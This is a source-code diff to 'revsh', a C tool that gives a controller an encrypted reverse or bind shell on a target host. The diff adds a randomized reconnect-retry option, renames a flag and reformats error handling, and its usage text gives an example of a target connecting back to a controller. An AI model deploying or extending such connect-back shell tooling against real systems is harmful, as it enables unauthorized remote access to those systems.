@@ -45,21 +45,22 @@
  *
  **********************************************************************************************************************/
 void usage(){
-	fprintf(stderr, "\nusage: %s [-c [-a] [-s SHELL] [-d KEYS_DIR] [-r RC_FILE]] [-b [-k]] [-t SECONDS] [ADDRESS:PORT]\n", \
+	fprintf(stderr, "\nusage: %s [-c [-a] [-s SHELL] [-d KEYS_DIR] [-f RC_FILE]] [-b [-k]] [-t SEC] [-r SEC1[,SEC2]] [ADDRESS:PORT]\n", \
 			program_invocation_short_name);
 	fprintf(stderr, "\n\t-c\t\tRun in controller mode.\t\t\t\t(Default is target mode.)\n");
 	fprintf(stderr, "\t-a\t\tEnable Anonymous Diffie-Hellman mode.\t\t(Default is \"%s\".)\n", CONTROLLER_CIPHER);
 	fprintf(stderr, "\t-s SHELL\tInvoke SHELL as the remote shell.\t\t(Default is \"%s\".)\n", DEFAULT_SHELL);
-	fprintf(stderr, "\t-d KEYS_DIR\tReference the keys in an alternate directory.\t(Default is \"%s/%s\".)\n", REVSH_DIR, KEYS_DIR);
-	fprintf(stderr, "\t-r RC_FILE\tReference an alternate rc file.\t\t\t(Default is \"%s/%s\".)\n", REVSH_DIR, RC_FILE);
-	fprintf(stderr, "\t-b\t\tStart in \"bind shell\" mode.\t\t\t(Default is reverse shell mode.)\n");
-	fprintf(stderr, "\t-k\t\tStart the bind shell in \"keep-alive\" mode.\t(Ignored in reverse shell mode.)\n");
-	fprintf(stderr, "\t-t\t\tSet the connection timeout to SECONDS.\t\t(Default is %d.)\n", TIMEOUT);
+	fprintf(stderr, "\t-d KEYS_DIR\tReference the keys in an alternate directory.\t(Default is \"%s/%s/\".)\n", REVSH_DIR, KEYS_DIR);
+	fprintf(stderr, "\t-f RC_FILE\tReference an alternate rc file.\t\t\t(Default is \"%s/%s\".)\n", REVSH_DIR, RC_FILE);
+	fprintf(stderr, "\t-b\t\tStart in bind shell mode.\t\t\t(Default is reverse shell mode.)\n");
+	fprintf(stderr, "\t-k\t\tStart the bind shell in keep-alive mode.\t(Ignored in reverse shell mode.)\n");
+	fprintf(stderr, "\t-t SEC\t\tSet the connection timeout to SEC seconds.\t(Default is \"%d\".)\n", TIMEOUT);
+	fprintf(stderr, "\t-r SEC1,SEC2\tSet the retry time to be SEC1 seconds, or\n\t\t\tto be random in the range from SEC1 to SEC2.\t(Default is \"%s\".)\n", RETRY);
 	fprintf(stderr, "\t-h\t\tPrint this help.\n");
-	fprintf(stderr, "\tADDRESS:PORT\tThe address and port of the controller.\t\t(Default is \"%s\".)\n", ADDRESS);
+	fprintf(stderr, "\tADDRESS:PORT\tThe address and port of the listening socket.\t(Default is \"%s\".)\n", ADDRESS);
 	fprintf(stderr, "\n\tNotes:\n");
 	fprintf(stderr, "\t\t* The -b flag must be invoked on both the control and target hosts to enable bind shell mode.\n");
-	fprintf(stderr, "\t\t* Bind shell mode can also be enabled by invoking the binary as \"bindsh\" instead of \"revsh\".\n");
+	fprintf(stderr, "\t\t* Bind shell mode can also be enabled by invoking the binary as 'bindsh' instead of 'revsh'.\n");
 	fprintf(stderr, "\n\tExample:\n");
 	fprintf(stderr, "\t\tlocal controller host:\trevsh -c 192.168.0.42:443\n");
 	fprintf(stderr, "\t\tremote target host:\trevsh 192.168.0.42:443\n");
@@ -142,7 +143,7 @@ int main(int argc, char **argv){
 	char **tmp_vector;
 
 	int buff_len, tmp_len;
-	char *buff_head, *buff_tail;
+	char *buff_head = NULL, *buff_tail;
 	char *buff_ptr;
 
 	int io_bytes;
@@ -195,6 +196,9 @@ int main(int argc, char **argv){
 	int timeout = TIMEOUT;
 	struct sigaction act;
 
+	char *retry_string = RETRY;
+	int retry_start, retry_stop, retry;
+
 	/*
 	 * Basic initialization.
 	 */
@@ -202,7 +206,7 @@ int main(int argc, char **argv){
 	io.controller = 0;
 	io.encryption = EDH;
 
-	while((opt = getopt(argc, argv, "pbkacs:d:r:ht:")) != -1){
+	while((opt = getopt(argc, argv, "pbkacs:d:f:r:ht:")) != -1){
 		switch(opt){
 
 			// plaintext
@@ -239,8 +243,12 @@ int main(int argc, char **argv){
 				keys_dir = optarg;
 				break;
 
-			case 'r':
+			case 'f':
 				rc_file = optarg;
+				break;
+
+			case 'r':
+				retry_string = optarg;
 				break;
 
 			case 't':
@@ -299,6 +307,30 @@ int main(int argc, char **argv){
 
 	SSL_library_init();
 	SSL_load_error_strings();
+
+	// Prepare the retry timer values.
+	errno = 0;
+	retry_start = strtol(retry_string, &buff_ptr, 10);
+	if(errno){
+		fprintf(stderr, "%s: %d: strtol(%s, %lx, 10): %s\r\n", \
+				program_invocation_short_name, io.controller, retry_string, \
+				(unsigned long) &buff_ptr, strerror(errno));
+		exit(-1);
+	}
+
+	if(*buff_ptr != '\0'){
+		buff_ptr++;
+	}
+
+	errno = 0;
+	retry_stop = strtol(buff_ptr, NULL, 10);
+	if(errno){
+		fprintf(stderr, "%s: %d: strtol(%s, NULL, 10): %s\r\n", \
+				program_invocation_short_name, io.controller, \
+				buff_ptr, strerror(errno));
+		exit(-1);
+	}
+
 
 	// The joy of a struct with pointers to functions. We only call "io.remote_read()" and the
 	// appropriate crypto / no crypto version is called on the backend.
@@ -459,12 +491,12 @@ int main(int argc, char **argv){
 
 		act.sa_handler = catch_alarm;
 
-    if((retval = sigaction(SIGALRM, &act, NULL)) == -1){
-      fprintf(stderr, "%s: %d: sigaction(%d, %lx, %p): %s\r\n", \
-          program_invocation_short_name, io.controller, \
-          SIGALRM, (unsigned long) &act, NULL, strerror(errno));
+		if((retval = sigaction(SIGALRM, &act, NULL)) == -1){
+			fprintf(stderr, "%s: %d: sigaction(%d, %lx, %p): %s\r\n", \
+					program_invocation_short_name, io.controller, \
+					SIGALRM, (unsigned long) &act, NULL, strerror(errno));
 			exit(-1);
-    }
+		}
 
 		alarm(timeout);
 
@@ -478,7 +510,21 @@ int main(int argc, char **argv){
 				exit(-1);
 			}
 
-			if(BIO_do_connect(io.connect) <= 0){
+			while(((retval = BIO_do_connect(io.connect)) != 1) && retry_start){
+
+				// Using RAND_pseudo_bytes() instead of RAND_bytes() because this is a best effort. We don't
+				// actually want to die or print an error if there is a lack of entropy.
+				if(retry_stop){
+					RAND_pseudo_bytes((unsigned char *) &tmp_char, 1);
+					retry = retry_start + ((unsigned int) tmp_char % (retry_stop - retry_start));
+				}else{
+					retry = retry_start;
+				}
+
+				sleep(retry);
+			}
+
+			if(retval != 1){
 				fprintf(stderr, "%s: %d: BIO_do_connect(%lx): %s\n", \
 						program_invocation_short_name, io.controller, (unsigned long) io.connect, strerror(errno));
 				ERR_print_errors_fp(stderr);
@@ -530,12 +576,12 @@ int main(int argc, char **argv){
 
 		act.sa_handler = SIG_DFL;
 
-    if((retval = sigaction(SIGALRM, &act, NULL)) == -1){
-      fprintf(stderr, "%s: %d: sigaction(%d, %lx, %p): %s\r\n", \
-          program_invocation_short_name, io.controller, \
-          SIGALRM, (unsigned long) &act, NULL, strerror(errno));
-    	exit(-1);
-    }
+		if((retval = sigaction(SIGALRM, &act, NULL)) == -1){
+			fprintf(stderr, "%s: %d: sigaction(%d, %lx, %p): %s\r\n", \
+					program_invocation_short_name, io.controller, \
+					SIGALRM, (unsigned long) &act, NULL, strerror(errno));
+			exit(-1);
+		}
 
 		alarm(0);
 
@@ -1060,14 +1106,14 @@ int main(int argc, char **argv){
 
 		act.sa_handler = catch_alarm;
 
-    if((retval = sigaction(SIGALRM, &act, NULL)) == -1){
+		if((retval = sigaction(SIGALRM, &act, NULL)) == -1){
 #ifdef DEBUG
-      fprintf(stderr, "%s: %d: sigaction(%d, %lx, %p): %s\r\n", \
-          program_invocation_short_name, io.controller, \
-          SIGALRM, (unsigned long) &act, NULL, strerror(errno));
+			fprintf(stderr, "%s: %d: sigaction(%d, %lx, %p): %s\r\n", \
+					program_invocation_short_name, io.controller, \
+					SIGALRM, (unsigned long) &act, NULL, strerror(errno));
 #endif
 			exit(-1);
-    }
+		}
 
 		alarm(timeout);
 
@@ -1155,7 +1201,7 @@ int main(int argc, char **argv){
 				}
 
 			} while(keepalive && retval);
-		
+
 			if(keepalive){
 				if(signal(SIGCHLD, SIG_DFL) == SIG_ERR){
 #ifdef DEBUG
@@ -1179,7 +1225,21 @@ int main(int argc, char **argv){
 				exit(-1);
 			}
 
-			if(BIO_do_connect(io.connect) <= 0){
+			while(((retval = BIO_do_connect(io.connect)) != 1) && retry_start){
+
+				// Using RAND_pseudo_bytes() instead of RAND_bytes() because this is a best effort. We don't
+				// actually want to die or print an error if there is a lack of entropy.
+				if(retry_stop){
+					RAND_pseudo_bytes((unsigned char *) &tmp_char, 1);
+					retry = retry_start + ((unsigned int) tmp_char % (retry_stop - retry_start));
+				}else{
+					retry = retry_start;
+				}
+
+				sleep(retry);
+			}
+
+			if(retval != 1){
 #ifdef DEBUG
 				fprintf(stderr, "%s: %d: BIO_do_connect(%lx): %s\n", \
 						program_invocation_short_name, io.controller, (unsigned long) io.connect, strerror(errno));
@@ -1191,14 +1251,14 @@ int main(int argc, char **argv){
 
 		act.sa_handler = SIG_DFL;
 
-    if((retval = sigaction(SIGALRM, &act, NULL)) == -1){
+		if((retval = sigaction(SIGALRM, &act, NULL)) == -1){
 #ifdef DEBUG
-      fprintf(stderr, "%s: %d: sigaction(%d, %lx, %p): %s\r\n", \
-          program_invocation_short_name, io->controller, \
-          SIGALRM, (unsigned long) &act, NULL, strerror(errno));
+			fprintf(stderr, "%s: %d: sigaction(%d, %lx, %p): %s\r\n", \
+					program_invocation_short_name, io->controller, \
+					SIGALRM, (unsigned long) &act, NULL, strerror(errno));
 #endif
 			exit(-1);
-    }
+		}
 
 		alarm(0);
 
